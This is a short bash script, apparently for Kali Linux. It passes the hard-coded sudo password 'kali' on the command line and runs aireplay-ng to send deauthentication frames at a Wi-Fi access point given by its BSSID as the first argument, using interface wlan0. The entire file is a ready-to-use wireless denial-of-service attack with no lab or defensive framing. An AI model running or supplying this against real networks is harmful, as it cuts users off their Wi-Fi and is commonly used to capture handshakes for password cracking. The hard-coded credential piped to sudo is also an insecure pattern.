#! /bin/bash

echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 wlan0
